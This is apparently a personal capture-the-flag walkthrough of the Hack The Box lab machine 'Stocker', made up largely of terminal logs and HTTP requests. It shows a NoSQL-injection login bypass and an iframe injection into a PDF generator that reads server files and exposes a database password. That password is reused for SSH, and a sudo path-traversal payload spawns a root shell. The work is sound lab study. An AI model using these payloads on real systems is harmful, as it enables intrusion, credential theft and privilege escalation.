@@ -1,0 +1,247 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: FUZZ.stocker.htb" -u http://10.10.11.196/ --hc 404,301,400
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.196/
+Total requests: 4746
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000001456:   302        0 L      4 W        28 Ch       "dev"                                               
+
+Total time: 0
+Processed Requests: 4746
+Filtered Requests: 4745
+Requests/sec.: 0
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali/etc/config]
+└─# curl -v dev.stocker.htb            
+* Host dev.stocker.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.196
+*   Trying 10.10.11.196:80...
+* Connected to dev.stocker.htb (10.10.11.196) port 80
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: dev.stocker.htb
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 302 Found
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Mon, 22 Sep 2025 04:41:56 GMT
+< Content-Type: text/plain; charset=utf-8
+< Content-Length: 28
+< Connection: keep-alive
+< X-Powered-By: Express
+< Location: /login
+< Vary: Accept
+< Set-Cookie: connect.sid=s%3ALN1dQnx_jd4fGAlbyVkW4JdGJy24Ey5k.nylchAqCRu4HTchdngnv5FAXgRTSkE8h0EcNSOOoGk0; Path=/; HttpOnly
+< 
+* Connection #0 to host dev.stocker.htb left intact
+Found. Redirecting to /login                                                                                                                     
+┌──(root㉿kali)-[/home/kali/etc/config]
+
+
+Express
+We are dealing with NodeJS
+
+
+POST /login HTTP/1.1
+Host: dev.stocker.htb
+Content-Length: 19
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://dev.stocker.htb
+Content-Type: application/json
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://dev.stocker.htb/login
+Accept-Encoding: gzip, deflate, br
+Cookie: connect.sid=s%3AoLWOo9tdOV6kcNn09mqb5mxjHKHF0LRG.GSeQjES9skdmJdCE6CTFwagV9wPTCZcAk%2BXJQ8F4FCc
+Connection: keep-alive
+
+{"username": {"$ne": null}, "password": {"$ne": null} }
+
+NOSQL injection
+
+"The purchase request seems to be sending a lot of information about each item, but the most interesting
+parameter is the title of the item as it is directly displayed in the PDF. We can deduce from this that a PDF
+generator is being used to create the PDF from the specific information about each file. PDF generators can
+typically also parse and render HTML tags, which opens up the possibility of an HTML injection.
+We can easily try this by changing the item title to <script>alert(1)</script> . After clicking on the link
+to redirect to the PDF the server sends back an Internal Server Error message, meaning that the
+generator tried to render the script tags but failed.
+Taking the above information into consideration, it might be possible for us to make the PDF generator load
+and display system files by using iframes . Consider the following HTML payload"
+
+
+We trigger an error to find more info from the underlying system.
+Network > Preview tab in DevTools
+
+SyntaxError: Unexpected token : in JSON at position 16
+    at JSON.parse (<anonymous>)
+    at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)
+    at /var/www/dev/node_modules/body-parser/lib/read.js:128:18
+    at AsyncResource.runInAsyncScope (node:async_hooks:203:9)
+    at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)
+    at done (/var/www/dev/node_modules/raw-body/index.js:220:7)
+    at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)
+    at IncomingMessage.emit (node:events:513:28)
+    at endReadableNT (node:internal/streams/readable:1359:12)
+    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
+
+our payload becomes
+
+POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+Content-Length: 156
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://dev.stocker.htb
+Referer: http://dev.stocker.htb/stock
+Accept-Encoding: gzip, deflate, br
+Cookie: connect.sid=s%3AoLWOo9tdOV6kcNn09mqb5mxjHKHF0LRG.GSeQjES9skdmJdCE6CTFwagV9wPTCZcAk%2BXJQ8F4FCc
+Connection: keep-alive
+
+{"basket":[{"_id":"638f116eeb060210cbd83a91","title":"Axe<iframe src='file:///var/www/dev/index.js' width='1000' height='1000'></iframe>","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}
+
+
+this gives us the pdf of
+Stockers - Purchase Order
+Supplier
+Stockers Ltd.
+1 Example Road
+Folkestone
+Kent
+CT19 5QS
+GB
+Purchaser
+Angoose
+1 Example Road
+London
+GB
+9/22/2025
+Thanks for shopping with us!
+Your order summary:
+Item Price
+(£) QAxe
+const express = require("express");
+const mongoose = require("mongoose");
+const session = require("express-session");
+const MongoStore = require("connect-mongo");
+const path = require("path");
+const fs = require("fs");
+const { generatePDF, formatHTML } = require("./pdf.js");
+const { randomBytes, createHash } = require("crypto");
+const app = express();
+const port = 3000;
+// TODO: Configure loading from dotenv for production
+const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+app.use(
+ session({
+ secret: randomBytes(32).toString("hex"),
+ resave: false,
+ saveUninitialized: true,
+ store: MongoStore.create({
+ mongoUrl: dbURI,
+ }),
+ })
+);
+app.use("/static", express.static(__dirname + "/assets"));
+app.get("/", (req, res) => {
+ return res.redirect("/login");
+});
+app.get("/api/products", async (req, res) => {
+ if (!req.session.user) return res.json([]);
+ const products = await mongoose.model("Product").find();
+ return res.json(products);
+});
+app.get("/login", (req, res) => {
+ if (req.session.user) return res.redirect("/stock");
+ return res.sendFile(__dirname + "/templates/login.html");
+});
+app.post("/login", async (req, res) => {
+ const { username, password } = req.body;
+ if (!username || !password) return res.redirect("/login?error=login-error");
+ // TODO: Implement hashing
+ const user = await mongoose.model("User").findOne({ username, password });
+ if (!user) return res.redirect("/login?error=login-error");
+ req.session.user = user.id;
+ console.log(req.session);
+ return res.redirect("/stock");
+});
+app.post("/api/order", async (req, res) => {
+ if (!req.session.user) return res.json({});
+12.00
+Total 12.00
+Orders are to be paid for within 30 days of purchase order creation.
+Contact support@stock.htb for any support queries.
+
+
+"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
+
+
+by abusing this same vuln, we find from /etc/passwd that there is one user angoose
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh angoose@stocker.htb 
+The authenticity of host 'stocker.htb (10.10.11.196)' can't be established.
+ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'stocker.htb' (ED25519) to the list of known hosts.
+angoose@stocker.htb's password: 
+angoose@stocker:~$ 
+
+
+angoose@stocker:~$ sudo -l
+[sudo] password for angoose: 
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+angoose@stocker:~$ 
+angoose@stocker:~$ cd /usr/local/scripts/
+angoose@stocker:/usr/local/scripts$ touch test.js
+touch: cannot touch 'test.js': Permission denied
+angoose@stocker:/usr/local/scripts$ ls -lsa
+total 32
+4 drwxr-xr-x  3 root root 4096 Dec  6  2022 .
+4 drwxr-xr-x 11 root root 4096 Dec  6  2022 ..
+4 -rwxr-x--x  1 root root  245 Dec  6  2022 creds.js
+4 -rwxr-x--x  1 root root 1625 Dec  6  2022 findAllOrders.js
+4 -rwxr-x--x  1 root root  793 Dec  6  2022 findUnshippedOrders.js
+4 drwxr-xr-x  2 root root 4096 Dec  6  2022 node_modules
+4 -rwxr-x--x  1 root root 1337 Dec  6  2022 profitThisMonth.js
+4 -rwxr-x--x  1 root root  623 Dec  6  2022 schema.js
+angoose@stocker:/usr/local/scripts$ echo 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})' > /tmp/shell.js
+angoose@stocker:/usr/local/scripts$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/shell.js
+root@stocker:/usr/local/scripts# id
+uid=0(root) gid=0(root) groups=0(root)
+root@stocker:/usr/local/scripts# 
+
+
+
+
+
+
+
+
